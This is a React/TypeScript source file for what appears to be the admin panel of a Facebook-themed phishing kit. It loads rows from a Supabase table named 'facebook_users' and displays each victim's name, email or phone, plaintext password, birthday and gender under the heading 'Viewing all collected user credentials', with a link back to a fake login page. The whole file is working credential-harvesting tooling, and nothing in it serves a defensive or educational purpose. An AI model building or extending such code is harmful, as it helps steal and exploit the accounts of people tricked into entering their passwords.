
import React, { useEffect, useState } from 'react';
import { supabase } from '../supabaseClient';

interface UserData {
  id: string;
  first_name: string;
  last_name: string;
  email_or_phone: string;
  password: string;
  birthday: string;
  gender: string;
  created_at: string;
}

const DataDashboard: React.FC<{ isDarkMode: boolean }> = ({ isDarkMode }) => {
  const [users, setUsers] = useState<UserData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const fetchUsers = async () => {
    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('facebook_users')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      setUsers(data || []);
    } catch (err: any) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  const navigateToHome = (e: React.MouseEvent) => {
    e.preventDefault();
    window.history.pushState({}, '', '/');
    window.dispatchEvent(new PopStateEvent('popstate'));
  };

  return (
    <div className={`min-h-screen p-8 transition-colors duration-300 ${isDarkMode ? 'bg-[#18191a] text-[#e4e6eb]' : 'bg-[#f0f2f5] text-[#1c1e21]'}`}>
      <div className="max-w-6xl mx-auto">
        <div className="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
          <div>
            <h1 className="text-3xl font-bold text-[#1877f2]">Admin Dashboard</h1>
            <p className={isDarkMode ? 'text-[#b0b3b8]' : 'text-[#606770]'}>Viewing all collected user credentials</p>
          </div>
          <div className="flex gap-4">
            <button 
              onClick={fetchUsers}
              className="bg-[#1877f2] hover:bg-[#166fe5] text-white px-6 py-2 rounded-md font-bold transition shadow-md"
            >
              Refresh Data
            </button>
            <a 
              href="/" 
              onClick={navigateToHome}
              className={`px-6 py-2 rounded-md font-bold border transition shadow-sm ${
                isDarkMode 
                  ? 'border-[#3e4042] bg-[#3a3b3c] hover:bg-[#4e4f50]' 
                  : 'border-gray-300 bg-white hover:bg-gray-50'
              }`}
            >
              Back to Login
            </a>
          </div>
        </div>

        {loading ? (
          <div className="flex justify-center items-center h-64">
            <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#1877f2]"></div>
          </div>
        ) : error ? (
          <div className="bg-red-50 border border-red-200 text-red-600 p-4 rounded-md">
            Error: {error}
          </div>
        ) : (
          <div className={`rounded-xl shadow-lg border overflow-hidden ${isDarkMode ? 'bg-[#242526] border-[#3e4042]' : 'bg-white border-gray-200'}`}>
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className={isDarkMode ? 'bg-[#3a3b3c] text-[#e4e6eb]' : 'bg-gray-50 text-gray-700'}>
                    <th className="p-4 border-b border-inherit font-bold">Name</th>
                    <th className="p-4 border-b border-inherit font-bold">Email / Phone</th>
                    <th className="p-4 border-b border-inherit font-bold">Password</th>
                    <th className="p-4 border-b border-inherit font-bold">Birthday</th>
                    <th className="p-4 border-b border-inherit font-bold">Gender</th>
                    <th className="p-4 border-b border-inherit font-bold">Joined At</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-inherit transition-colors">
                  {users.length === 0 ? (
                    <tr>
                      <td colSpan={6} className="p-8 text-center text-gray-500 italic">No data collected yet.</td>
                    </tr>
                  ) : (
                    users.map((user) => (
                      <tr key={user.id} className={isDarkMode ? 'hover:bg-[#303132]' : 'hover:bg-blue-50/50'}>
                        <td className="p-4 font-medium">{user.first_name} {user.last_name}</td>
                        <td className="p-4 text-[#1877f2]">{user.email_or_phone}</td>
                        <td className="p-4">
                          <code className={`px-2 py-1 rounded ${isDarkMode ? 'bg-[#3a3b3c]' : 'bg-gray-100'}`}>
                            {user.password}
                          </code>
                        </td>
                        <td className="p-4">{new Date(user.birthday).toLocaleDateString()}</td>
                        <td className="p-4">
                          <span className={`px-2 py-1 rounded-full text-xs font-bold ${
                            user.gender === 'Male' ? 'bg-blue-100 text-blue-700' : 
                            user.gender === 'Female' ? 'bg-pink-100 text-pink-700' : 
                            'bg-gray-200 text-gray-700'
                          }`}>
                            {user.gender}
                          </span>
                        </td>
                        <td className="p-4 text-xs text-gray-500">
                          {new Date(user.created_at).toLocaleString()}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default DataDashboard;
